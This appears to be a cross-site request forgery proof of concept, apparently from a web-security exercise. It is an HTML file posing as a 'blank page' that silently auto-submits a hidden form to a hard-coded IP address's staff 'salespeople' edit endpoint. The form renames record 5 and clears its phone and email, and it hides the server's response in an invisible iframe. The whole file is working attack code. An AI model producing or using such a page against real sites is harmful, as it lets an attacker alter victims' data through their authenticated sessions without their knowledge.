<html>
    <head>
        <title>blank page</title>
    </head>
    <body onload="document.redForm.submit()">
        <form name="redForm" action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=5" method="POST" name="edit_user" target="hidden_results">
            <input type="hidden" name="first_name" value="Kenneth">
            <input type="hidden" name="last_name" value="Banker">
            <input type="hidden" name="phone" value="">
            <input type="hidden" name="email" value="">
            <input type="hidden" name="submit" value="Update">
            <iframe name="hidden_results" style="display: none;"></iframe>
        </form>
    </body>
</html>
<script>
 document.redForm.submit();
</script>
